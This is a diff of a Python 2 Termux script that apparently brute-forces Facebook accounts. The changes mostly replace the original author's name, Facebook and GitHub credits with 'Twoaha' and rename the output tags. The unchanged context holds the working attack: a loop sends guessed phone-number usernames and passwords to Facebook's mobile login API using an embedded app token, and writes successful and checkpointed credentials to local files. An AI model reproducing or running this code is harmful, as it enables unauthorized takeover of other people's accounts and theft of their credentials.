@@ -80,9 +80,9 @@ def menu():
     os.system('clear')
     print logo
     print '                                              \033[107;1m version :0.1\033[00;1m'
-    print '\x1b[1;93mAUTHOR   : \x1b[1;92mTahidul Khan'                                           
-    print '\x1b[1;93mFACEBOOK : \x1b[1;92mTERMUX LOVER'
-    print '\x1b[1;93mGITHUB   : \x1b[1;92mTAHIDUL-123'
+    print '\x1b[1;93mAUTHOR   : \x1b[1;92mTwoaha'                                           
+    print '\x1b[1;93mFACEBOOK : \x1b[1;92mTwoaha'
+    print '\x1b[1;93mGITHUB   : \x1b[1;92mTwoaha'
     print ''
     print '\x1b[1;97m============================================'
     print '\x1b[1;91m[1]  \x1b[1;93mGP'
@@ -233,13 +233,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[KHAN-OK]\x1b[0m ' + k + c + user + ' | ' + pass1  +  '\n' + '\n'
+                print '\x1b[1;92m[Twoaha-OK]\x1b[0m ' + k + c + user + ' | ' + pass1  +  '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;93m[KHAN-CP]\x1b[1;93m ' + k + c + user + ' | ' + pass1  +  '\x1b[1;93m  [Open After 07 Days]\x1b[0m \n'
+                print '\x1b[1;93m[Twoaha-CP]\x1b[1;93m ' + k + c + user + ' | ' + pass1  +  '\x1b[1;93m  [Open After 07 Days]\x1b[0m \n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
@@ -256,7 +256,7 @@ def action():
     '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
     print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
     raw_input('\n[Press Enter To Go Back]')
-    os.system('python2 Bangla.py')
+    os.system('python2 bangladesh.py')
 
 
 if __name__ == '__main__':
